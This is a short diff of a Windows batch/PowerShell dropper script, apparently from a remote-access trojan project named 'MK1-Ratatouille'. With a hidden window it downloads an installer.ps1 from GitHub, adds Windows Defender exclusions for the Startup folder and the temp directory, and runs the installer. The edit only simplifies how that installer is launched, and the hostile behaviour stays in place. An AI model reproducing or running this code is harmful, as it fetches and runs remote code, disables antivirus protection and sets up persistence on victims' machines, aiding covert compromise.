@@ -51,7 +51,7 @@ powershell -windowstyle hidden -c ^
     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
     Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
     Add-MpPreference -ExclusionPath '$env:temp'^
-    powershell powershell.exe -windowstyle hidden -ep bypass .\installer.ps1; ^
+    .\installer.ps1; ^
 } catch { ^
     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
 }"
